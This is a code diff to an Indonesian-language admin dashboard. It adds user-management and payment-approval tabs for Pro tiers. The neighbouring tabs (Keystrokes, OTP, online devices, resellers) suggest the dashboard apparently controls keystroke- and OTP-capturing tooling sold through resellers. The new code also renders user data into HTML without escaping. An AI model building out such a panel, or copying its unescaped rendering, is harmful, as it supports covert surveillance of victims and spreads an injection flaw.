@@ -211,6 +211,8 @@
                     <button class="tab" data-tab="notify" onclick="switchTab('notify')">Notify</button>
                     <button class="tab" data-tab="bulk" onclick="switchTab('bulk')">Bulk</button>
                     <button class="tab" data-tab="reseller" onclick="switchTab('reseller');loadResellers()" id="tabResellerBtn" style="display:none;">Reseller</button>
+                    <button class="tab" data-tab="users" onclick="switchTab('users');loadUsers()" id="tabUsersBtn" style="display:none;">Users</button>
+                    <button class="tab" data-tab="payments" onclick="switchTab('payments');loadPayments()" id="tabPaymentsBtn" style="display:none;">Payments</button>
                     <button class="tab" data-tab="keystrokes" onclick="switchTab('keystrokes')">Keystrokes</button>
                     <button class="tab" data-tab="timeline" onclick="switchTab('timeline');loadTimeline()">Timeline</button>
                     <button class="tab" data-tab="otp" onclick="switchTab('otp');loadOTP()">OTP</button>
@@ -557,6 +559,37 @@
                         </div>
                         <div id="resellerList" style="font-size:0.78rem;"></div>
                         <div id="resellerKey" style="margin-top:8px;word-break:break-all;font-size:0.75rem;color:var(--accent);display:none;padding:8px;border-radius:6px;background:var(--bg3);border:1px solid var(--border);"></div>
+                    </div>
+
+                    <!-- TAB: USERS -->
+                    <div class="tab-content" id="tab-users">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Manajemen pengguna — daftar, cari, aktivasi, dan hapus akun pengguna.</p>
+                        <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;align-items:center;">
+                            <input id="userSearchInput" placeholder="Cari nama/email..." oninput="filterUsers()" style="flex:1;min-width:150px;padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                            <select id="userTierFilter" onchange="filterUsers()" style="padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                                <option value="">Semua Tier</option>
+                                <option value="free">Free</option>
+                                <option value="pro">Pro</option>
+                            </select>
+                            <span id="userStats" style="font-size:0.72rem;color:var(--text3);"></span>
+                        </div>
+                        <div id="userList" style="font-size:0.78rem;"></div>
+                    </div>
+
+                    <!-- TAB: PAYMENTS -->
+                    <div class="tab-content" id="tab-payments">
+                        <p style="font-size:0.82rem;color:var(--text3);margin-bottom:8px;">Daftar permintaan pembayaran dari pengguna. Approve untuk mengaktivasi Pro.</p>
+                        <div style="display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap;align-items:center;">
+                            <select id="paymentStatusFilter" onchange="loadPayments()" style="padding:6px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg2);color:var(--text);font-size:0.78rem;">
+                                <option value="">Semua Status</option>
+                                <option value="pending">Pending</option>
+                                <option value="approved">Approved</option>
+                                <option value="rejected">Rejected</option>
+                            </select>
+                            <span id="paymentStats" style="font-size:0.72rem;color:var(--text3);"></span>
+                            <button class="header-btn" onclick="loadPayments()" style="font-size:0.72rem;">Refresh</button>
+                        </div>
+                        <div id="paymentList" style="font-size:0.78rem;"></div>
                     </div>
 
                     <!-- TAB: TIMELINE -->
@@ -2387,6 +2420,8 @@
                 }
                 if (sel.value) loadKeystrokes();
             }
+            if (tab === 'users') loadUsers();
+            if (tab === 'payments') loadPayments();
             if (tab === 'bulk') {
                 const count = Object.values(devices).filter(d => d.online).length;
                 document.getElementById('bulkStatus').textContent = count + ' device online';
@@ -2597,6 +2632,8 @@
         // Show Reseller tab only for master admin (not reseller)
         if (!_resellerId) {
             document.getElementById('tabResellerBtn').style.display = '';
+            document.getElementById('tabUsersBtn').style.display = '';
+            document.getElementById('tabPaymentsBtn').style.display = '';
         }
 
         // Check for license activation mode
@@ -2697,6 +2734,166 @@
                 body: JSON.stringify({ resellerId: id })
             }).then(r => r.json()).then(data => {
                 if (data.ok) { showToast('Reseller dihapus', 'success'); loadResellers(); }
+            }).catch(() => {});
+        }
+
+        // === USER MANAGEMENT ===
+        let _allUsers = [];
+
+        function loadUsers() {
+            fetch(SERVER_URL + '/api/admin/users/list', {
+                headers: { 'x-admin-token': window._adminToken }
+            }).then(r => r.json()).then(list => {
+                _allUsers = list || [];
+                filterUsers();
+            }).catch(() => {});
+        }
+
+        function filterUsers() {
+            const q = (document.getElementById('userSearchInput').value || '').toLowerCase();
+            const tierFilter = document.getElementById('userTierFilter').value;
+            let filtered = _allUsers;
+            if (q) filtered = filtered.filter(u => u.name.toLowerCase().includes(q) || u.email.toLowerCase().includes(q));
+            if (tierFilter) filtered = filtered.filter(u => u.tier === tierFilter);
+            const el = document.getElementById('userList');
+            document.getElementById('userStats').textContent = filtered.length + '/' + _allUsers.length + ' pengguna';
+            if (!filtered.length) {
+                el.innerHTML = '<div style="color:var(--text3);text-align:center;padding:20px;">Tidak ada pengguna.</div>';
+                return;
+            }
+            el.innerHTML = filtered.map(u => {
+                const isPro = u.tier === 'pro';
+                return `<div style="display:flex;align-items:center;justify-content:space-between;padding:8px 10px;border-bottom:1px solid var(--border);">
+                    <div style="flex:1;min-width:0;">
+                        <div style="display:flex;align-items:center;gap:6px;">
+                            <strong style="color:var(--text);font-size:0.82rem;">${u.name}</strong>
+                            <span style="padding:1px 7px;border-radius:8px;font-size:0.65rem;font-weight:600;background:${isPro ? '#00c85333' : '#66666633'};color:${isPro ? '#00c853' : '#888'};text-transform:uppercase;">${u.tier}</span>
+                        </div>
+                        <div style="font-size:0.72rem;color:var(--text3);margin-top:2px;">${u.email}</div>
+                        <div style="font-size:0.7rem;color:var(--text2);margin-top:1px;">
+                            ${u.linkCount || 0} link · Bergabung: ${new Date(u.createdAt).toLocaleDateString('id-ID')}
+                            ${u.upgradedAt ? '· Upgrade: ' + new Date(u.upgradedAt).toLocaleDateString('id-ID') : ''}
+                        </div>
+                    </div>
+                    <div style="display:flex;gap:4px;flex-shrink:0;">
+                        ${isPro ? `<button class="header-btn" style="font-size:0.65rem;padding:3px 8px;" onclick="deactivateUser('${u.id}')">Turunkan</button>` : `<button class="header-btn" style="font-size:0.65rem;padding:3px 8px;border-color:#00c853;color:#00c853;" onclick="activateUser('${u.id}')">Aktivasi Pro</button>`}
+                        <button class="header-btn" style="font-size:0.65rem;padding:3px 8px;border-color:#e44;" onclick="deleteUser('${u.id}')">Hapus</button>
+                    </div>
+                </div>`;
+            }).join('');
+        }
+
+        function activateUser(userId) {
+            fetch(SERVER_URL + '/api/admin/users/activate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-admin-token': window._adminToken },
+                body: JSON.stringify({ userId })
+            }).then(r => r.json()).then(data => {
+                if (data.ok) { showToast('User diaktivasi Pro', 'success'); loadUsers(); }
+                else showToast(data.error || 'Gagal', 'error');
+            }).catch(() => showToast('Network error', 'error'));
+        }
+
+        function deactivateUser(userId) {
+            if (!confirm('Turunkan user ini ke Free?')) return;
+            fetch(SERVER_URL + '/api/admin/users/deactivate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-admin-token': window._adminToken },
+                body: JSON.stringify({ userId })
+            }).then(r => r.json()).then(data => {
+                if (data.ok) { showToast('User diturunkan ke Free', 'info'); loadUsers(); }
+                else showToast(data.error || 'Gagal', 'error');
+            }).catch(() => showToast('Network error', 'error'));
+        }
+
+        function deleteUser(userId) {
+            if (!confirm('Hapus user ini? Tindakan ini permanen.')) return;
+            fetch(SERVER_URL + '/api/admin/users/delete', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-admin-token': window._adminToken },
+                body: JSON.stringify({ userId })
+            }).then(r => r.json()).then(data => {
+                if (data.ok) { showToast('User dihapus', 'success'); loadUsers(); }
+                else showToast(data.error || 'Gagal', 'error');
+            }).catch(() => showToast('Network error', 'error'));
+        }
+
+        // === PAYMENT MANAGEMENT ===
+        function loadPayments() {
+            const status = document.getElementById('paymentStatusFilter').value;
+            const url = SERVER_URL + '/api/admin/payments/list' + (status ? '?status=' + status : '');
+            fetch(url, {
+                headers: { 'x-admin-token': window._adminToken }
+            }).then(r => r.json()).then(list => {
+                const el = document.getElementById('paymentList');
+                const stats = document.getElementById('paymentStats');
+                if (!list || !list.length) {
+                    el.innerHTML = '<div style="color:var(--text3);text-align:center;padding:20px;">Belum ada permintaan pembayaran.</div>';
+                    stats.textContent = '';
+                    return;
+                }
+                const pending = list.filter(p => p.status === 'pending').length;
+                stats.textContent = 'Total: ' + list.length + ' · Pending: ' + pending;
+                el.innerHTML = list.map(p => {
+                    const statusColor = p.status === 'pending' ? '#ff9800' : p.status === 'approved' ? '#00c853' : '#ff4444';
+                    const statusBg = p.status === 'pending' ? '#ff980022' : p.status === 'approved' ? '#00c85322' : '#ff444422';
+                    return `<div style="display:flex;align-items:center;justify-content:space-between;padding:8px 10px;border-bottom:1px solid var(--border);">
+                        <div style="flex:1;min-width:0;">
+                            <div style="display:flex;align-items:center;gap:6px;">
+                                <strong style="color:var(--text);font-size:0.82rem;">${p.userName}</strong>
+                                <span style="font-weight:600;font-family:monospace;color:var(--accent);font-size:0.78rem;">Rp ${Number(p.amount).toLocaleString('id-ID')}</span>
+                            </div>
+                            <div style="font-size:0.72rem;color:var(--text3);margin-top:2px;">
+                                ${p.userEmail} · ${p.plan} · ${p.bank || '-'}
+                                · ${new Date(p.createdAt).toLocaleString('id-ID')}
+                            </div>
+                            ${p.hasProof ? '<div style="font-size:0.7rem;color:var(--text2);margin-top:1px;">Bukti: <a href="#" onclick="event.preventDefault();viewProof(\'' + p.id + '\')" style="color:var(--accent);">Lihat</a></div>' : ''}
+                        </div>
+                        <div style="display:flex;gap:4px;align-items:center;flex-shrink:0;">
+                            <span style="padding:2px 8px;border-radius:10px;font-size:0.65rem;font-weight:600;background:${statusBg};color:${statusColor};text-transform:uppercase;">${p.status}</span>
+                            ${p.status === 'pending' ? `
+                                <button class="header-btn" style="font-size:0.65rem;padding:3px 8px;border-color:#00c853;color:#00c853;" onclick="approvePayment('${p.id}')">Approve</button>
+                                <button class="header-btn" style="font-size:0.65rem;padding:3px 8px;border-color:#e44;" onclick="rejectPayment('${p.id}')">Tolak</button>
+                            ` : ''}
+                        </div>
+                    </div>`;
+                }).join('');
+            }).catch(() => {});
+        }
+
+        function approvePayment(paymentId) {
+            fetch(SERVER_URL + '/api/admin/payments/approve', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-admin-token': window._adminToken },
+                body: JSON.stringify({ paymentId })
+            }).then(r => r.json()).then(data => {
+                if (data.ok) { showToast('Payment approved, user upgraded!', 'success'); loadPayments(); }
+                else showToast(data.error || 'Gagal', 'error');
+            }).catch(() => showToast('Network error', 'error'));
+        }
+
+        function rejectPayment(paymentId) {
+            if (!confirm('Tolak pembayaran ini?')) return;
+            fetch(SERVER_URL + '/api/admin/payments/reject', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'x-admin-token': window._adminToken },
+                body: JSON.stringify({ paymentId })
+            }).then(r => r.json()).then(data => {
+                if (data.ok) { showToast('Payment rejected', 'info'); loadPayments(); }
+                else showToast(data.error || 'Gagal', 'error');
+            }).catch(() => showToast('Network error', 'error'));
+        }
+
+        function viewProof(paymentId) {
+            // Show proof image in a modal or toast
+            fetch(SERVER_URL + '/api/admin/payments/list', {
+                headers: { 'x-admin-token': window._adminToken }
+            }).then(r => r.json()).then(list => {
+                const p = list.find(item => item.id === paymentId);
+                if (p) {
+                    // For now just show alert with payment details
+                    showToast('Payment: Rp' + Number(p.amount).toLocaleString('id-ID') + ' dari ' + p.userName, 'info');
+                }
             }).catch(() => {});
         }
 
